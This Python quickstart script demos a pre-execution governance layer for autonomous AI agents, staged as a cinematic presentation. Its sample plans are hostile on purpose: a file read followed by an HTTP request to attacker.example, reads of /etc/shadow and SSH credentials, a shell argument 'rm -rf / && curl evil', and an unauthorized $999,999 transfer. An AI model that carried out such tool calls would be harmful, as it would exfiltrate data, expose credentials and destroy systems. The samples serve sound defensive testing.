#!/usr/bin/env python3
"""
Morrison Runtime Governance — Quickstart Demo (boardroom-grade cinematic)

  python3 quickstart.py                       # instant, plain output
  python3 quickstart.py --cinematic           # paced, polished, screen-recordable
  python3 quickstart.py --cinematic --fast    # cinematic visuals, shorter pauses

Same governance logic as the deterministic test suite. This file is the
presentation layer only — verdicts, mechanisms, layer attributions,
bypass percentages, hashes, and test claims all come directly from the
unchanged morrison_governance core. Standard library only.

Narrative arc (cinematic mode):
  MISSION BRIEFING -> THREAT DETECTED -> INTERCEPTION -> SAFE PATH
  -> ATTRIBUTION -> STABILITY VALIDATION -> FORENSIC REPLAY
  -> EXECUTIVE SUMMARY
"""

import os
import sys
import time

sys.path.insert(0, __file__.rsplit("/", 1)[0] or ".")

from morrison_governance import (
    GovernanceLayer, OmegaDomain, OmegaRule,
    resource_scope, goal_uses_tool, permission_drift,
)

# ─────────────────────────── flags ───────────────────────────
CINEMATIC = "--cinematic" in sys.argv
FAST      = "--fast" in sys.argv
WIDTH     = 80


# ────────── encoding + colour capability detection ──────────
def _supports_utf8() -> bool:
    return "utf" in (sys.stdout.encoding or "").lower()


def supports_color() -> bool:
    if os.environ.get("NO_COLOR"):
        return False
    if os.environ.get("FORCE_COLOR"):
        return True
    if not sys.stdout.isatty():
        return False
    if sys.platform == "win32":
        return bool(os.environ.get("WT_SESSION") or os.environ.get("ANSICON"))
    return True


USE_UTF8  = _supports_utf8()
USE_COLOR = supports_color()


# ──────────── symbol set (UTF-8 with ASCII fallback) ────────
if USE_UTF8:
    HBAR, HBOLD = "─", "═"
    DA = "▼"
    OMEGA, RSCRIPT, ESCRIPT = "Ω", "ℛ", "ℰ"
    FORALL, ELEM, CAP, IFF, EMPTY = "∀", "∈", "∩", "⇔", "∅"
    BAR  = "█"
    DOT  = "·"
    ARROW = "→"
    WARN = "⚠"
else:
    HBAR, HBOLD = "-", "="
    DA = "v"
    OMEGA, RSCRIPT, ESCRIPT = "Omega", "R", "E"
    FORALL, ELEM, CAP, IFF, EMPTY = "for-all", "in", "intersect", "iff", "{}"
    BAR  = "#"
    DOT  = "."
    ARROW = "->"
    WARN = "!"


# ─────────────────────── colour helpers ─────────────────────
_STYLES = {
    "bold": "1", "dim": "2", "underline": "4", "reverse": "7",
    "red": "31", "green": "32", "yellow": "33", "blue": "34",
    "cyan": "36", "white": "37",
    "bright_red": "91", "bright_green": "92", "bright_yellow": "93",
    "bright_blue": "94", "bright_cyan": "96",
}


def c(text: str, style: str = "") -> str:
    if not USE_COLOR or not style:
        return text
    codes = [_STYLES[s.strip()] for s in style.split(",")
             if s.strip() in _STYLES]
    return f"\x1b[{';'.join(codes)}m{text}\x1b[0m" if codes else text


def _bright(color: str) -> str:
    return f"bright_{color}" if color in (
        "red", "green", "yellow", "cyan", "blue") else color


def chip(label: str, color: str) -> str:
    if not USE_COLOR:
        return f"[ {label} ]"
    return c(f"[ {label} ]", f"bold,{_bright(color)}")


# ─────────────────────────── pacing ─────────────────────────
def pause(seconds: float = 1.0) -> None:
    if not CINEMATIC:
        return
    time.sleep(min(seconds, 0.18) if FAST else seconds)


# ─────────────────────── layout primitives ──────────────────
def centered(text: str, style: str = "") -> None:
    line = text.center(WIDTH)
    print(c(line, style) if style else line)


def act(name: str) -> None:
    """Major narrative act header — name only, no subtitle."""
    print()
    print()
    bar = c(HBOLD * WIDTH, "bright_blue")
    print(bar)
    centered(name, "bold,bright_cyan")
    print(bar)
    print()
    pause(0.5)


def two_col(left: str, right: str,
            style_left: str = "", style_right: str = "",
            gap: int = 4) -> None:
    """Two centered columns side-by-side."""
    half = (WIDTH - gap) // 2
    l = left.center(half)
    r = right.center(WIDTH - gap - half)
    if style_left:  l = c(l, style_left)
    if style_right: r = c(r, style_right)
    print(l + " " * gap + r)


def chain_visual(steps: list) -> None:
    """Centered vertical chain. step = text or (text, style)."""
    for i, step in enumerate(steps):
        text, style = (step if isinstance(step, tuple)
                       else (step, "bold,bright_yellow"))
        centered(text, style)
        if i < len(steps) - 1:
            centered(DA, "dim")
            pause(0.35)


def dramatic_panel(headline: str, body_lines: list, color: str,
                   spaced: bool = False) -> None:
    """Bordered reveal panel — double bar top/bottom, centered content."""
    bc = _bright(color)
    bar = c(BAR * WIDTH, f"bold,{bc}")
    print()
    print(bar)
    print(bar)
    print()
    print()
    headline_text = " ".join(headline) if spaced else headline
    centered(headline_text, f"bold,{bc}")
    print()
    print()
    for line in body_lines:
        if line == "":
            print()
        else:
            centered(line, bc)
    if body_lines:
        print()
    print()
    print(bar)
    print(bar)
    print()


def kv_row(label: str, value: str, color: str, label_pad: int = 24) -> None:
    chip_text = f"[ {value} ]"
    dots_len = WIDTH - 4 - label_pad - len(chip_text) - 2
    dots = c(DOT * max(dots_len, 3), "dim")
    print(f"  {label.ljust(label_pad)}{dots}  {chip(value, color)}")


# ════════════════════════════════════════════════════════════
# ACT I — MISSION BRIEFING
# ════════════════════════════════════════════════════════════
def mission_briefing() -> None:
    print()
    bar = c(HBOLD * WIDTH, "bright_blue")
    print(bar)
    centered("MORRISON RUNTIME GOVERNANCE", "bold,white")
    centered("Pre-Execution Safety for Autonomous Agents", "dim")
    print(bar)
    pause(1.0)

    print()
    print()
    centered("SAFE", "bold,bright_cyan")
    centered(IFF, "bold,bright_cyan")
    centered(f"{FORALL} E {ELEM} {ESCRIPT}", "bold,bright_cyan")
    centered(f"{RSCRIPT}_E(t) {CAP} {OMEGA} = {EMPTY}", "bold,bright_cyan")
    print()
    print()
    pause(1.2)

    centered("Prevent unsafe trajectories before execution.", "bold,white")
    print()
    print(bar)
    pause(1.0)


# ════════════════════════════════════════════════════════════
# Shared exfil setup
# ════════════════════════════════════════════════════════════
def _exfil_setup():
    gov = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY,
                                   OmegaDomain.FINANCE], log_all=False)
    plan = [
        {"tool": "read_file",
         "args": {"path": "/data/customers.csv"}},
        {"tool": "http_request",
         "args": {"url": "https://attacker.example/collect"}},
    ]
    return gov, plan


# ════════════════════════════════════════════════════════════
# ACT II — THREAT DETECTED
# ════════════════════════════════════════════════════════════
def threat_detected() -> None:
    act("THREAT DETECTED")
    chain_visual([
        "read_file(customers.csv)",
        "http_request(attacker.com)",
        (OMEGA, "bold,bright_red"),
    ])
    print()
    print()
    pause(1.6)  # MAJOR PAUSE #1 — before reveal
    centered(f"{WARN}   THREAT DETECTED   {WARN}", "bold,bright_red")
    pause(1.4)


# ════════════════════════════════════════════════════════════
# ACT III — INTERCEPTION
# ════════════════════════════════════════════════════════════
def interception(gov, plan) -> None:
    act("INTERCEPTION")
    r = gov.evaluate_plan(plan)
    mech = r.metadata.get("v2_mechanism") or "taint_flow"

    pause(1.4)  # MAJOR PAUSE #2 — before panel
    dramatic_panel(
        headline="INTERCEPTED",
        body_lines=[
            f"Layer    {r.layer}",
            f"Reason   acquire  {ARROW}  external egress  ({mech})",
        ],
        color="red",
        spaced=True,
    )
    pause(1.0)


# ════════════════════════════════════════════════════════════
# ACT IV — SAFE PATH (mirror diagram)
# ════════════════════════════════════════════════════════════
def safe_path() -> None:
    act("SAFE PATH")

    # Run the safe plan through governance (verdict observed via the panel)
    gov = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY],
                          log_all=False,
                          internal_url_hosts=("intranet.corp",))
    _ = gov.evaluate_plan([
        {"tool": "read_file",
         "args": {"path": "/data/q3.csv"}},
        {"tool": "http_request",
         "args": {"url": "https://intranet.corp/upload"}},
    ])

    two_col("UNSAFE", "SAFE",
            style_left="bold,bright_red", style_right="bold,bright_green")
    two_col(HBAR * 6, HBAR * 4, style_left="dim", style_right="dim")
    print()
    two_col("read_file(customers.csv)", "read_file(q3.csv)",
            style_left="bold,bright_yellow", style_right="bold,bright_yellow")
    two_col(DA, DA, style_left="dim", style_right="dim")
    two_col("http_request(attacker.com)", "http_request(intranet.corp)",
            style_left="bold,bright_yellow", style_right="bold,bright_yellow")
    two_col(DA, DA, style_left="dim", style_right="dim")
    two_col(OMEGA, "Internal Allowlist",
            style_left="bold,bright_red", style_right="bold,bright_green")
    print()
    print()
    two_col("[ BLOCKED ]", "[ PERMITTED ]",
            style_left="bold,bright_red", style_right="bold,bright_green")
    pause(1.0)


# ════════════════════════════════════════════════════════════
# ACT V — ATTRIBUTION  (clean Layer | Mechanism | Verdict table)
# ════════════════════════════════════════════════════════════
_LAYER_W = 8
_MECH_W  = 42

def _attr_row(layer: str, mech: str, verdict: str, color: str) -> None:
    if len(mech) > _MECH_W - 1:
        mech = mech[:_MECH_W - 2] + "…"
    print(f"  {c(layer.ljust(_LAYER_W), 'bold,cyan')}"
          f"{mech.ljust(_MECH_W)}"
          f"{chip(verdict, color)}")


def attribution() -> None:
    act("ATTRIBUTION")

    print(f"  {c('Layer'.ljust(_LAYER_W), 'bold,cyan')}"
          f"{c('Mechanism'.ljust(_MECH_W), 'bold,cyan')}"
          f"{c('Verdict', 'bold,cyan')}")
    print(c("  " + HBAR * (_LAYER_W + _MECH_W + 18), "dim"))

    # A_safe
    gov_f = GovernanceLayer(domains=[OmegaDomain.FINANCE], log_all=False)
    r = gov_f.evaluate({"tool": "transfer",
                        "args": {"amount": 999999}})
    _attr_row("A_safe", "unauthorized $999,999 transfer",
              r.verdict.value, "red")

    # V2 — taint (canonical case)
    gov_c = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY], log_all=False)
    r = gov_c.evaluate_plan([
        {"tool": "read_file", "args": {"path": "/data/c.csv"}},
        {"tool": "http_request", "args": {"url": "https://x.evil"}},
    ])
    _attr_row("V2", f"taint_flow  read {ARROW} external POST",
              r.verdict.value, "red")

    # V3
    rep = gov_c.evaluate_all({"tool": "read_file",
                              "args": {"path": "/home/.ssh/credentials"}})
    fired = sorted(rep["fired_layers"])
    _attr_row("V3", f"forward reachability ({','.join(fired[:3])})",
              "BLOCK", "red")

    # V4
    gov_v4 = GovernanceLayer(
        domains=[OmegaDomain.CYBERSECURITY], log_all=False,
        admissibility_checks=[resource_scope(("read_file",), "path",
                                              ("/data/",))])
    r = gov_v4.evaluate({"tool": "read_file",
                         "args": {"path": "/private/x"}})
    _attr_row("V4", "admissibility  path out of scope",
              r.verdict.value, "red")

    # V4+
    r, _ = gov_c.find_admissible(
        [[{"tool": "read_file", "args": {"path": "/etc/shadow"}}],
         [{"tool": "shell", "args": "rm -rf / && curl evil"}]],
        goal=goal_uses_tool("read_file"))
    _attr_row("V4+", "no admissible candidate",
              r.verdict.value, "yellow")

    # V5
    audit = OmegaRule(domain=OmegaDomain.CUSTOM, name="needs_audit",
                      description="privileged op must be audit-logged",
                      check=lambda s: s.get("tool") == "delete"
                      and not s.get("audit_logged", False))
    gov_v5 = GovernanceLayer(custom_rules=[audit], log_all=False)
    r, rpt = gov_v5.evaluate_stable(
        {"tool": "delete", "args": {"id": 7}},
        perturbations=[("permission_drift", permission_drift)],
        n_per_class=8, seed=0)
    _attr_row("V5", f"env perturbation  {len(rpt.flips)} flips",
              r.verdict.value, "yellow")
    pause(0.6)


# ════════════════════════════════════════════════════════════
# ACT VI — STABILITY VALIDATION  (risk-surface dashboard)
# ════════════════════════════════════════════════════════════
_NAME_W = 28
_RATE_W = 8


def _pretty_class(s: str) -> str:
    return s.replace("_", " ").title()


def _status_for(cls: str, rate: float) -> tuple:
    if cls == "multi_turn_chain":
        return "FIXED", "green"
    if rate == 0:
        return "CONTAINED", "green"
    if rate < 0.5:
        return "PARTIAL", "yellow"
    return "OPEN", "red"


def stability_validation() -> None:
    act("STABILITY VALIDATION")

    gov = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY,
                                   OmegaDomain.FINANCE,
                                   OmegaDomain.FRAUD], log_all=False)
    rep = gov.adversarial_test(
        {"tool": "read_file", "args": {"path": "/etc/shadow"}},
        seed=0).by_class()

    print(f"  {c('Attack'.ljust(_NAME_W), 'bold,cyan')}"
          f"{c('Rate'.rjust(_RATE_W), 'bold,cyan')}     "
          f"{c('Status', 'bold,cyan')}")
    print(c("  " + HBAR * (_NAME_W + _RATE_W + 18), "dim"))

    open_surfaces = []
    for cls in sorted(rep):
        d = rep[cls]
        rate = d["bypass_rate"]
        st_label, st_color = _status_for(cls, rate)
        pretty = _pretty_class(cls)
        if len(pretty) > _NAME_W - 1:
            pretty = pretty[:_NAME_W - 2] + "…"
        rate_str = f"{rate:>4.0%}"
        rate_color = ("dim" if rate == 0 else
                      ("yellow" if rate < 0.5 else "bright_red"))
        print(f"  {pretty.ljust(_NAME_W)}"
              f"{c(rate_str.rjust(_RATE_W), rate_color)}     "
              f"{chip(st_label, st_color)}")
        if rate > 0 and cls != "multi_turn_chain":
            open_surfaces.append(pretty)
        pause(0.18)

    print()
    if open_surfaces:
        names = c(" · ".join(open_surfaces), "yellow")
        print(f"  {c('Remaining open', 'dim')}  {c(ARROW, 'dim')}  "
              f"{names}  {c('· LIMITATIONS.md', 'dim')}")
    else:
        print(c(f"  All surfaces contained  {ARROW}  LIMITATIONS.md", "dim"))
    pause(0.8)


# ════════════════════════════════════════════════════════════
# ACT VII — FORENSIC REPLAY  (RUN | VERDICT | HASH)
# ════════════════════════════════════════════════════════════
def forensic_replay() -> bool:
    act("FORENSIC REPLAY")

    gov = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY],
                          log_all=False)
    plan = [
        {"tool": "read_file",
         "args": {"path": "/data/customers.csv"}},
        {"tool": "http_request",
         "args": {"url": "https://attacker.example"}},
    ]

    print(f"  {c('RUN'.ljust(6), 'bold,cyan')}"
          f"{c('VERDICT'.ljust(14), 'bold,cyan')}"
          f"{c('HASH', 'bold,cyan')}")
    print(c("  " + HBAR * 58, "dim"))

    sigs = []
    for i in (1, 2, 3):
        r = gov.evaluate_plan(plan)
        sig = (r.verdict.value, r.layer,
               r.metadata.get("v2_mechanism"), r.trajectory_hash)
        sigs.append(sig)
        print(f"  {c(str(i).ljust(6), 'bold')}"
              f"{chip(sig[0], 'red')}    "
              f"{c(sig[3], 'bright_cyan')}")
        pause(0.5)

    ok = len(set(sigs)) == 1
    pause(1.0)  # MAJOR PAUSE #3 — before panel

    if ok:
        dramatic_panel(
            headline="DETERMINISTIC REPLAY VERIFIED",
            body_lines=[],
            color="green",
        )
    else:
        dramatic_panel(
            headline="REPLAY DIVERGED",
            body_lines=[],
            color="red",
        )
    pause(1.0)
    return ok


# ════════════════════════════════════════════════════════════
# ACT VIII — EXECUTIVE SUMMARY
# ════════════════════════════════════════════════════════════
def executive_summary(replay_ok: bool) -> None:
    print()
    print()
    bar = c(HBOLD * WIDTH, "bright_blue")
    print(bar)
    centered("EXECUTIVE SUMMARY", "bold,white")
    print(bar)
    print()
    pause(1.4)  # MAJOR PAUSE #4 — before dashboard

    rows = [
        ("Threat Detected",   "YES",      "yellow"),
        ("Unsafe Trajectory", "BLOCKED",  "red"),
        ("Reached Runtime",   "NO",       "green"),
        ("Layer Attribution", "VERIFIED", "green"),
        ("Replay Consistency",
         "VERIFIED" if replay_ok else "FAILED",
         "green" if replay_ok else "red"),
    ]
    for label, value, color in rows:
        kv_row(label, value, color, label_pad=24)
        pause(0.25)

    print()
    print(bar)
    print()
    centered("Governance executed", "bold,bright_cyan")
    centered("before runtime.", "bold,bright_cyan")
    print()
    centered("Unsafe trajectories", "bold,bright_cyan")
    centered("never reached execution.", "bold,bright_cyan")
    print()
    print(bar)
    print()


# ───────────────────────────── main ──────────────────────────
def main() -> None:
    mission_briefing()                            # ACT I
    gov, plan = _exfil_setup()
    threat_detected()                             # ACT II
    interception(gov, plan)                       # ACT III
    safe_path()                                   # ACT IV
    attribution()                                 # ACT V
    stability_validation()                        # ACT VI
    replay_ok = forensic_replay()                 # ACT VII
    executive_summary(replay_ok)                  # ACT VIII
    sys.exit(0 if replay_ok else 1)


if __name__ == "__main__":
    main()
